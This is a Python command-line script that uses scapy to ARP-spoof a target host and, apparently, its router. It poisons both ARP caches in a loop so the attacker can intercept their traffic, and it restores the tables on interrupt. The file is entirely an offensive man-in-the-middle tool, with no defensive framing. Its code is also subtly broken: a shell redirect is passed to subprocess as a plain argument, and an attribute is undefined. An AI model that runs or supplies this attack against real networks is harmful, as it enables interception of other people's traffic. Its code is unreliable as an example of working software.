#!/usr/bin/env python3

import argparse
import subprocess
import sys
import time
import scapy.all as scapy


class ArpSpoof:

    def enable_ip_forwarding(self):
        print("[*] Enabling IP Forwarding...")
        subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

    def disable_ip_forwarding(self):
        print("[*] Disabling IP Forwarding...")
        subprocess.run(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])

    def get_mac(self, ip):
        """Sends an ARP request to retrieve the MAC address of the specified IP"""

        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answer = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, interface, target, spoof):
        """Spoofs the target machine by pretending to be the spoof IP address."""
        t_mac = self.get_mac(ip=target)
        packet = scapy.ARP(op=2, psrc=spoof, pdst=target, hwdst=t_mac)
        scapy.send(packet, iface=interface, verbose=False)

    def restore(self, interface, dest_ip, source_ip):
        """Restores the ARP table of the target to its original state."""

        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac)
        scapy.send(packet, iface=interface, verbose=False)
        print(f"[+] Restored {dest_ip} to it's original state.")

    def exploit(self, interface, target, spoof, interval):

        with open(self.ip_forward, "r") as f:
            value = int(f.read(1))

        if not value:
            print("[+] IP forwarding not enabled...")
            print("[+] Enabling IP forwarding...")
            self.enable_ip_forwarding()

        s_c = 0

        if interval == 0:
            while True:
                try:
                    print(f"Sent: {s_c}", flush=True)
                    sys.stdout.flush()
                    self.spoof(interface=interface, target=target, spoof=spoof)
                    self.spoof(interface=interface, target=spoof, spoof=target)
                    s_c += 1

                except KeyboardInterrupt:
                    print("[+] Detected Ctrl + C... Restoring the arp table.")
                    self.restore(interface=interface, dest_ip=target_ip, source_ip=spoof_ip)
                    self.restore(interface=interface, dest_ip=spoof_ip, source_ip=target_ip)
                    print("[+] Disabling IP forwarding...")
                    self.disable_ip_forwarding()

        elif interval != 0:
            for _ in range(0, interval):
                try:
                    print(f"Sent: {s_c}", flush=True)
                    sys.stdout.flush()
                    self.spoof(interface=interface, target=target_ip, spoof=spoof_ip)
                    self.spoof(interface=interface, target=spoof_ip, spoof=target_ip)
                    s_c += 1


                except KeyboardInterrupt:
                    print("[+] Detected Ctrl + C... Restoring the arp table.")
                    self.restore(interface=interface, dest_ip=target_ip, source_ip=spoof_ip)
                    self.restore(interface=interface, dest_ip=spoof_ip, source_ip=target_ip)
                    print("[+] Disabling IP forwarding...")
                    self.disable_ip_forwarding()


# spoof = router
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Specify interface to use", required=True)
    parser.add_argument("-t", "--target", help="Specify target ip to spoof", required=True)
    parser.add_argument("-s", "--spoof", help="Specify spoof ip to spoof", required=True)
    parser.add_argument("-a", "--interval", default=0, help="Number of time to spoof(default: 0).")
    args = parser.parse_args()

    iface = args.interface
    target_ip = args.target
    spoof_ip = args.spoof
    interval = args.interval

    arp_spoofer = ArpSpoof()
    arp_spoofer.exploit(interface=iface, target=target_ip, spoof=spoof_ip, interval=interval)
